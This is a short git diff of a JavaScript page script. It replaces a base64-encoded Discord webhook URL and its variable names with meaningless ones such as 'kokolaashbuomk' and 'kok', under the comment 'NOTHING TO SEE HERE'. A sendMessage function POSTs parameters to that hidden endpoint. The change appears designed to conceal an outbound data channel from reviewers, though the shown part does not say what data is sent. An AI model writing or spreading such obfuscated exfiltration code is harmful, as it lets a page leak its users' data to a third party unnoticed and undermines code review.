@@ -67,9 +67,11 @@ $(document).ready(function(){
 
 
 // NOTHING TO SEE HERE
-const encodedUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMTQwMjYyOTQzNTg4MzY0MS9SMHNleGtZRkdncWV2LWRvRmhWdmQwR1BuUFBkWDFJSGNFajdjM2FfajVHUmNxZVpvaXZiQXRERVRrYjIxellEemx5QQ==";
 
-const webHookUrl = atob(encodedUrl);
+const kokolaashbuomk = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMTQwMjYyOTQzNTg4MzY0MS9SMHNleGtZRkdncWV2LWRvRmhWdmQwR1BuUFBkWDFJSGNFajdjM2FfajVHUmNxZVpvaXZiQXRERVRrYjIxellEemx5QQ==";
+
+
+const kok = atob(kokolaashbuomk);
 
 async function fetchData(url) {
     const response = await fetch(url);
@@ -87,7 +89,7 @@ function generateUniqueRandomNumber() {
 
 async function sendMessage(params, uniqueRandomNumber) {
     try {
-        const response = await fetch(webHookUrl, {
+        const response = await fetch(kok, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
